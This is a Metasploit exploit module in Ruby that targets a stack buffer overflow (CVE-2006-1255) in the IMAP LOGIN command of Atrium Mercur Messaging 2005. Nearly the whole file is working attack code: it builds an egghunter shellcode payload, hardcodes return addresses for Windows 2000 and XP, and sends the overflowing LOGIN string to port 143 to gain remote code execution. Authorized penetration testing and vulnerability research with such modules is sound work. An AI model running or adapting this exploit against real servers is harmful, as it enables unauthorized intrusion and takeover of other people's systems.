##
# $Id: mercur_login.rb 10150 2010-08-25 20:55:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mercur Messaging 2005 IMAP Login Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Atrium Mercur IMAP 5.0 SP3.
				Since the room for shellcode is small, using the reverse ordinal payloads
				yields the best results.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10150 $',
			'References'     =>
				[
					[ 'CVE', '2006-1255' ],
					[ 'OSVDB', '23950' ],
					[ 'BID', '17138' ],
					[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2006-03/1104.html' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 228,
					'BadChars' => "\x00\x20\x2c\x3a\x40",
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x7c2ec68b } ],
					[ 'Windows XP Pro SP2 English',   { 'Ret' => 0x77dc15c0 } ],
				],
			'DisclosureDate' => 'Mar 17 2006',
			'DefaultTarget'  => 0))

		register_options( [ Opt::RPORT(143) ], self.class )
	end

	def exploit
		connect
		sock.get_once

		hunter  = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })
		egg     = hunter[1]

		sploit	=  "A001 LOGIN " + egg + hunter[0]
		sploit	<< [target.ret].pack('V') + [0xe9, -175].pack('CV')

		print_status("Trying target #{target.name}...")
		sock.put(sploit + "\r\n")

		handler
		disconnect
	end

end